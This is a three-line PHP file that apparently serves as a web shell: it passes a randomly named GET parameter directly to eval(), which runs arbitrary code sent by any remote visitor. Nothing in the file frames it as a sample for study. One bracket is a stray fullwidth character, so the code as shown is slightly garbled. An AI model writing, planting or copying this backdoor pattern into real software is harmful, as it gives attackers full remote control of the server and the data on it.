<?php
eval($_GET['ko8PsqCq'〕);
?>
